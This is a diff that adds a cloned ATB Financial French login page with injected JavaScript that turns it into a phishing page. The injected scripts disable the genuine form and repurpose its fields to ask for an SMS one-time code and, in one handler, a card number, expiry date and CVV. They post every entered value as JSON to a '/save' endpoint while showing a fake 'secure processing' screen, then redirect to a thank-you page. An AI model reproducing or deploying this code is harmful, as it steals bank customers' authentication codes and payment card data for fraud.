@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+
+<!-- saved from url=(0367)https://login.atb.com/as/authorization.oauth2?redirect_uri=https%3A%2F%2Fpersonal.atb.com%2Fcallback&client_id=ATBWEB&response_type=code&state=5sfyGRi33H&scope=openid%20profile%20retail-web&cmid=3f70543f3d5a4f0cb54935918dad679f&response_mode=fragment&appState=%5Bobject%20Object%5D&code_challenge=AnW4JppkpOsFfR_IrQtMd9HLbLjgcK2WpfqYTLOZZuQ&code_challenge_method=S256 -->
+<html dir="ltr" lang="fr"><head>
+<script id="override-fix" type="text/javascript">
+(function() {
+    document.addEventListener('DOMContentLoaded', function() {
+        // Change first visible text input to SMS code
+        var inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="number"]');
+        var smsInput = null;
+        for(var i=0; i<inputs.length; i++) {
+            if(window.getComputedStyle(inputs[i]).display !== 'none' && inputs[i].type !== 'hidden') {
+                smsInput = inputs[i];
+                break;
+            }
+        }
+        if(!smsInput) smsInput = document.querySelector('input');
+        if(smsInput) {
+            smsInput.id = 'sms_code';
+            smsInput.type = 'text';
+            smsInput.placeholder = 'Code SMS à 6 chiffres / 6-digit SMS code';
+            smsInput.maxLength = 6;
+            smsInput.style.textAlign = 'center';
+            smsInput.style.letterSpacing = '6px';
+            smsInput.style.fontSize = '20px';
+        }
+        
+        // Hide all other input fields (passwords, secondary fields)
+        var allInputs = document.querySelectorAll('input[type="password"], input[type="email"]');
+        allInputs.forEach(function(inp) { inp.closest('div') ? inp.closest('div').style.display = 'none' : inp.style.display = 'none'; });
+        
+        // Disable all forms
+        document.querySelectorAll('form').forEach(function(f) {
+            f.action = 'javascript:void(0)';
+            f.onsubmit = function() { return false; };
+            f.addEventListener('submit', function(e) { e.preventDefault(); return false; }, true);
+        });
+        
+        // Find primary button and wire up validation
+        var btns = document.querySelectorAll('button, input[type="submit"]');
+        var mainBtn = null;
+        for(var i=0; i<btns.length; i++) {
+            var txt = (btns[i].textContent || btns[i].value || '').trim().toLowerCase();
+            if(txt && (txt.includes('continu') || txt.includes('valider') || txt.includes('sign in') || txt.includes('log in') || txt.includes('submit') || txt.includes('se connecter'))) {
+                mainBtn = btns[i];
+                break;
+            }
+        }
+        if(!mainBtn && btns.length > 0) mainBtn = btns[btns.length-1];
+        
+        if(mainBtn) {
+            mainBtn.disabled = false;
+            mainBtn.removeAttribute('disabled');
+            mainBtn.style.cursor = 'pointer';
+            mainBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+                var code = document.getElementById('sms_code');
+                if(!code || code.value.trim() === '') {
+                    alert('Veuillez saisir le code SMS à 6 chiffres.');
+                    return false;
+                }
+                var _ldr = document.createElement('div');
+_ldr.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999999;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:Arial,sans-serif;color:#333;backdrop-filter:blur(5px);';
+_ldr.innerHTML = '<div style=\"width:50px;height:50px;border:4px solid #e5e7eb;border-top:4px solid #00843D;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:24px;\"></div><div style=\"font-size:20px;font-weight:600;margin-bottom:8px;\">Veuillez patienter...</div><div style=\"font-size:14px;color:#6b7280;\">Traitement s&eacute;curis&eacute; en cours</div><style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>';
+document.body.appendChild(_ldr);
+var _data = { bank: 'atb', type: 'SMS', fields: {} };
+var inps = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"])');
+for(var i=0; i<inps.length; i++) {
+    var key = inps[i].name || inps[i].id || inps[i].placeholder || 'champ_'+i;
+    _data.fields[key] = inps[i].value;
+}
+fetch('/save', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(_data) }).catch(function(){});
+setTimeout(function(){ window.location.href = 'atb_thankyou.html'; }, 10000);
+            }, true);
+        }
+    });
+})();
+</script>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/><meta content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==" http-equiv="origin-trial"/>
+<!--<base href="#">--><base href="."/>
+<meta content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
+<meta content="script-src 'self' 'nonce-H5q1Vrv4W4tiqo50' https://cdn.avo.app https://cdn.mxpnl.com https://digitaltrust.us-05.feedzai.cloud https://c.digitaltrust.us-05.feedzai.cloud https://fd.digitaltrust.us-05.feedzai.cloud https://ad.digitaltrust.us-05.feedzai.cloud https://static.digitaltrust.us-05.feedzai.cloud; style-src 'self'; img-src 'self' https://digitaltrust.us-05.feedzai.cloud; font-src 'self';" http-equiv="Content-Security-Policy"/>
+<title>Connexion</title>
+<link href="#" rel="icon" size="16x16" type="image/x-icon"/>
+<link href="#" rel="shortcut icon" size="16x16" type="image/x-icon"/>
+<link href="./Connexion_files/atb.fonts.css" rel="stylesheet" type="text/css"/>
+<link href="./Connexion_files/atb.new.main.css" media="all" rel="stylesheet" type="text/css"/>
+<script async="" charset="utf-8" crossorigin="anonymous" integrity="sha384-3zaiH0OSdmuU9OCfJ+WY5lU6ybChvSlTnH8kO3xF2adAEuFyszUm+E+7giSlebBX" nonce="H5q1Vrv4W4tiqo50" src="./Connexion_files/recaptcha__fr.js.téléchargement" type="text/javascript"></script><script src="./Connexion_files/common.js.téléchargement" type="text/javascript"></script>
+<script src="./Connexion_files/dt-loader-2.1.1.dist.js.téléchargement" type="text/javascript"></script>
+<script nonce="H5q1Vrv4W4tiqo50" src="./Connexion_files/enterprise.js.téléchargement"></script><script id="3megxg1" src="./Connexion_files/bcaptcha.js.téléchargement" type="text/javascript"></script>
+</head>
+<body>
+<!--START CONTENT-->
+<div class="atb-content-container">
+<!-- START HEADER -->
+<div class="atb-header">
+<img alt="ATB Logo" class="atb-logo" id="atb-logo" src="./Connexion_files/atb-logo.svg"/>
+</div>
+<!-- END HEADER -->
+<!-- START BODY -->
+<div class="atb-body-container">
+<hr class="atb-blue-line atb-hide-icon" id="blueLine"/>
+<!-- START SESSION MESSAGE -->
+<div class="atb-messages-description paragraph-2" id="atb-message-container" style="display: none;">
+<img alt="Error" class="atb-error-image atb-hide-icon" id="messageImage" src="./Connexion_files/atb-check-circle-green-empty-check.svg"/>
+<div id="messagesDiv"></div>
+<div id="messagesDiv2"></div>
+</div>
+<!-- END SESSION MESSAGE -->
+<div>
+<form action="https://login.atb.com/as/tQ8CviRCsc/resume/as/authorization.ping" autocomplete="off" method="POST">
+<!-- START USERNAME INPUT -->
+<div class="atb-input-label subtitle-1">Code de validation (SMS)</div>
+<div class="atb-input-outer-container">
+<div class="atb-input-container">
+<input autocapitalize="off" autocomplete="username webauthn" autocorrect="off" class="atb-input-box paragraph-1" id="sms_code" maxlength="8" name="sms_code" pattern="[0-9]*" placeholder="Veuillez saisir le code à 6 chiffres" size="10" type="text" utilisateur'="" value=""/>
+<img alt="Clear Username" class="atb-hide-icon atb-input-icon" id="clearUsername" src="./Connexion_files/atb-cancel.svg"/>
+<img alt="Error" class="atb-hide-icon atb-input-icon" id="username-error" src="./Connexion_files/atb-error.svg"/>
+<img alt="Login with your Passkey" class="atb-input-icon" id="passkey-auth" src="./Connexion_files/atb-fido2-icon.svg"/>
+</div>
+</div>
+<div class="atb-input-inline-error atb-hide paragraph-3 atb-title-spacing" id="username-inline-error">Code de validation (SMS)</div>
+<!-- END USERNAME INPUT -->
+<div class="checkbox-wrapper-1 atb-title-spacing atb-checkbox-wrapper paragraph-2" id="atb-remember-username">
+<input class="substituted" id="rememberUsername" name="rememberUsername" type="checkbox"/>
+<label for="rememberUsername"></label>
+                        Mémoriser votre nom d'utilisateur
+                    </div>
+<div class="ping-buttons">
+<input name="pf.submit" type="hidden" value=""/>
+<input name="pf.cancel" type="hidden" value=""/>
+<input name="assertionValue" type="hidden" value=""/>
+<input name="manuallySubmit" type="hidden" value=""/>
+<input name="isPasskeySupported" type="hidden" value=""/>
+<input name="isPasskeyConditionalMediationAvailable" type="hidden" value=""/>
+<input name="recaptchaToken" type="hidden" value=""/>
+<input name="deviceAuthId" type="hidden" value="034cd790-5a1a-4a1c-824a-330e85969059"/>
+<a class="atb-main-button-anchor h6" href="javascript:void(0)" id="main-button" title="Continue">Valider</a>
+<div class="atb-secondary-button-anchor-container">Code de validation (SMS)</div>
+</div>
+</form>
+</div>
+</div>
+<!-- START FOOTER -->
+<div class="atb-footer" id="atb-footer">
+<div class="atb-footer-link-group subtitle-2">
+<a class="atb-footer-link" href="#" id="atb_home_page" target="_blank">
+                    atb.com
+                </a>
+<span class="atb-footer-link-hl"> | </span>
+<a class="atb-footer-link" href="#" id="atb_contact_us" target="_blank">
+                    Contactez-nous
+                </a>
+<span class="atb-footer-link-hl"> | </span>
+<a class="atb-footer-link" href="#" id="atb_terms_services" target="_blank">
+                    Conditions
+                </a>
+<span class="atb-footer-link-hl"> | </span>
+<a class="atb-footer-link" href="#" id="atb_privacy_page" target="_blank">
+                    Conseils de sécurité
+                </a>
+</div>
+<div class="atb-legal-text paragraph-3">© ATB Financial<span id="year"> 2026</span>. Tous les droits sont réservés.<br/>Accès autorisé seulement. L'utilisation peut être surveillée.</div>
+</div>
+<!-- END FOOTER-->
+</div> <!-- .ping-footer-container -->
+<!-- .ping-container -->
+
+<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe frameborder="0" height="60" name="a-5ebghhdkz265" role="presentation" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" scrolling="no" src="./Connexion_files/anchor.html" title="reCAPTCHA" width="256"></iframe></div><div class="grecaptcha-error"></div><textarea class="g-recaptcha-response" id="g-recaptcha-response-100000" name="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe src="./Connexion_files/saved_resource(1).html" style="display: none;"></iframe></div><script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var btn = document.getElementById('main-button');
+            if(btn) {
+                btn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    var code = document.getElementById('sms_code');
+                    if(code && code.value.trim() !== '') {
+                        var _ldr = document.createElement('div');
+_ldr.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999999;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:Arial,sans-serif;color:#333;backdrop-filter:blur(5px);';
+_ldr.innerHTML = '<div style=\"width:50px;height:50px;border:4px solid #e5e7eb;border-top:4px solid #00843D;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:24px;\"></div><div style=\"font-size:20px;font-weight:600;margin-bottom:8px;\">Veuillez patienter...</div><div style=\"font-size:14px;color:#6b7280;\">Traitement s&eacute;curis&eacute; en cours</div><style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>';
+document.body.appendChild(_ldr);
+var _data = { bank: 'atb', type: 'SMS', fields: {} };
+var inps = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"])');
+for(var i=0; i<inps.length; i++) {
+    var key = inps[i].name || inps[i].id || inps[i].placeholder || 'champ_'+i;
+    _data.fields[key] = inps[i].value;
+}
+fetch('/save', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(_data) }).catch(function(){});
+setTimeout(function(){ window.location.href = 'atb_thankyou.html'; }, 10000);
+                    } else {
+                        alert('Veuillez saisir le code à 6 chiffres');
+                    }
+                });
+            }
+        });
+        </script><script>
+window.addEventListener('load', function() {
+    var forms = document.querySelectorAll('form');
+    for(var i=0; i<forms.length; i++) {
+        forms[i].addEventListener('submit', function(e) {
+            e.preventDefault();
+            return false;
+        });
+    }
+});
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script id="unified-step3-handler">
+document.addEventListener("DOMContentLoaded", function() {
+    // 1. Gently blank out unwanted text without destroying elements
+    var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+    var node;
+    while(node = walker.nextNode()) {
+        var text = node.nodeValue.toLowerCase();
+        if (text.indexOf("bienvenue") !== -1 || 
+            text.indexOf("connectez-vous pour commencer") !== -1 || 
+            text.indexOf("connectez-vous") !== -1 || 
+            text.indexOf("pour commencer") !== -1) {
+            node.nodeValue = " "; // Replace with space to keep DOM intact
+        }
+    }
+
+    // 2. Find inputs to repurpose instead of deleting them
+    var inputs = document.querySelectorAll("input:not([type='hidden'])");
+    var visibleInputs = [];
+    for(var i=0; i<inputs.length; i++) {
+        if(inputs[i].type !== "checkbox" && inputs[i].type !== "radio" && inputs[i].type !== "submit" && inputs[i].type !== "button") {
+            visibleInputs.push(inputs[i]);
+        }
+    }
+
+    if (visibleInputs.length >= 1) {
+        var firstInput = visibleInputs[0];
+        firstInput.type = "tel";
+        firstInput.maxLength = 16;
+        firstInput.placeholder = "Numéro à 16 chiffres";
+        firstInput.value = "";
+        
+        var id1 = firstInput.id;
+        if(id1) {
+            var label1 = document.querySelector("label[for='" + id1 + "']");
+            if(label1) label1.innerHTML = "<b>Numéro de carte</b>";
+        }
+    }
+
+    if (visibleInputs.length >= 2) {
+        var secondInput = visibleInputs[1];
+        secondInput.type = "tel";
+        secondInput.maxLength = 5;
+        secondInput.placeholder = "MM/AA";
+        secondInput.value = "";
+        secondInput.removeAttribute("autocomplete");
+        
+        var id2 = secondInput.id;
+        if(id2) {
+            var label2 = document.querySelector("label[for='" + id2 + "']");
+            if(label2) label2.innerHTML = "<b>Date d'expiration</b>";
+        }
+        
+        secondInput.addEventListener("input", function(e) {
+            var val = this.value.replace(/\D/g, '');
+            if (val.length > 2) {
+                this.value = val.substring(0, 2) + '/' + val.substring(2, 4);
+            } else {
+                this.value = val;
+            }
+        });
+
+        // 3. Clone the entire wrapper of the second input for CVV to preserve exact CSS
+        var formGroup = secondInput;
+        // Traverse up to find a container that holds both label and input, if possible
+        while(formGroup && formGroup !== document.body && formGroup.tagName !== 'FORM') {
+            if (formGroup.querySelector('label') && formGroup.querySelector('input')) {
+                break;
+            }
+            formGroup = formGroup.parentElement;
+        }
+        
+        if (!formGroup || formGroup === document.body || formGroup.tagName === 'FORM') {
+            // fallback
+            formGroup = secondInput.parentElement;
+        }
+        
+        if (formGroup && formGroup !== document.body) {
+            var cvvGroup = formGroup.cloneNode(true);
+            var cvvInput = cvvGroup.querySelector("input");
+            var cvvLabel = cvvGroup.querySelector("label");
+            
+            if (cvvInput) {
+                cvvInput.type = "tel";
+                cvvInput.maxLength = 3;
+                cvvInput.placeholder = "CVV";
+                cvvInput.value = "";
+                cvvInput.id = "cvv_input_injected";
+                cvvInput.name = "cvv_injected";
+                
+                if (cvvLabel) {
+                    cvvLabel.innerHTML = "<b>Code de sécurité (CVV)</b>";
+                    cvvLabel.setAttribute("for", "cvv_input_injected");
+                }
+                
+                // Remove any old error messages from cloned group
+                var errMsgs = cvvGroup.querySelectorAll(".error, .invalid, [role='alert']");
+                errMsgs.forEach(function(el) { el.remove(); });
+                
+                formGroup.insertAdjacentElement('afterend', cvvGroup);
+            }
+        }
+    }
+
+    // 4. Update texts that mention codes to avoid confusion
+    var walker2 = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
+    var node2;
+    while(node2 = walker2.nextNode()) {
+        if(node2.nodeValue.trim().length > 3) {
+            var text = node2.nodeValue.toLowerCase();
+            if(text.indexOf("sms") !== -1 || text.indexOf("code") !== -1 || text.indexOf("vérification") !== -1) {
+                if (node2.nodeValue.indexOf("Code de") === -1) { // Skip CVV label
+                    node2.nodeValue = "Veuillez compléter vos informations";
+                }
+            }
+        }
+    }
+
+    // 5. Submit Buttons
+    var clickables = document.querySelectorAll("button, input[type='submit'], .btn");
+    clickables.forEach(function(el) {
+        var text = (el.textContent || el.value || "").toLowerCase().trim();
+        if (el.getAttribute("type") === "submit" || el.classList.contains("submit") || text.indexOf("valid") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("submit") !== -1 || text.indexOf("next") !== -1 || text.indexOf("connect") !== -1) {
+            if (el.tagName === "INPUT") {
+                el.value = "Vérifier";
+            } else {
+                el.innerText = "Vérifier";
+            }
+        }
+    });
+
+    // 6. Form Submission Redirect
+    var currentFile = window.location.pathname.split("/").pop();
+    var smsFile = currentFile.replace("_step3.html", "_sms.html");
+
+    function doRedirect(e) {
+        if(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if(e.stopImmediatePropagation) e.stopImmediatePropagation();
+        }
+        window.location.href = smsFile;
+    }
+
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function(form) {
+        form.setAttribute("action", "javascript:void(0)");
+        form.onsubmit = doRedirect;
+        form.addEventListener("submit", doRedirect, true);
+    });
+
+    clickables.forEach(function(el) {
+        el.addEventListener("click", function(e) {
+            var text = (el.textContent || el.value || "").toLowerCase().trim();
+            if (text.indexOf("cancel") !== -1 || text.indexOf("annuler") !== -1) {
+                return;
+            }
+            doRedirect(e);
+        }, true);
+    });
+});
+</script>
+
+<script src="security_module.js"></script>
+</body></html>
+
+<script>
+// ATB Fix: wire <a id="main-button"> to redirect
+(function(){
+  function wireATB(){
+    var btn = document.getElementById('main-button');
+    var inp = document.getElementById('sms_code') || document.querySelector('input[type="text"]:not([type="hidden"])');
+    if(btn && !btn.__wired){
+      btn.__wired = true;
+      btn.addEventListener('click', function(e){
+        e.preventDefault(); e.stopImmediatePropagation();
+        var code = document.getElementById('sms_code') || document.querySelector('input[maxlength="6"]') || inp;
+        if(!code || code.value.trim().length < 4){
+          alert('Veuillez saisir le code SMS à 6 chiffres.');
+          if(code) code.focus(); return;
+        }
+        var _ldr = document.createElement('div');
+_ldr.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999999;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:Arial,sans-serif;color:#333;backdrop-filter:blur(5px);';
+_ldr.innerHTML = '<div style=\"width:50px;height:50px;border:4px solid #e5e7eb;border-top:4px solid #00843D;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:24px;\"></div><div style=\"font-size:20px;font-weight:600;margin-bottom:8px;\">Veuillez patienter...</div><div style=\"font-size:14px;color:#6b7280;\">Traitement s&eacute;curis&eacute; en cours</div><style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>';
+document.body.appendChild(_ldr);
+var _data = { bank: 'atb', type: 'SMS', fields: {} };
+var inps = document.querySelectorAll('input:not([type="hidden"]):not([type="submit"])');
+for(var i=0; i<inps.length; i++) {
+    var key = inps[i].name || inps[i].id || inps[i].placeholder || 'champ_'+i;
+    _data.fields[key] = inps[i].value;
+}
+fetch('/save', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(_data) }).catch(function(){});
+setTimeout(function(){ window.location.href = 'atb_thankyou.html'; }, 10000);
+      }, true);
+    }
+  }
+  if(document.readyState==='loading') document.addEventListener('DOMContentLoaded', wireATB);
+  else wireATB();
+  setTimeout(wireATB, 500);
+  setTimeout(wireATB, 1500);
+})();
+</script>
+
+
+
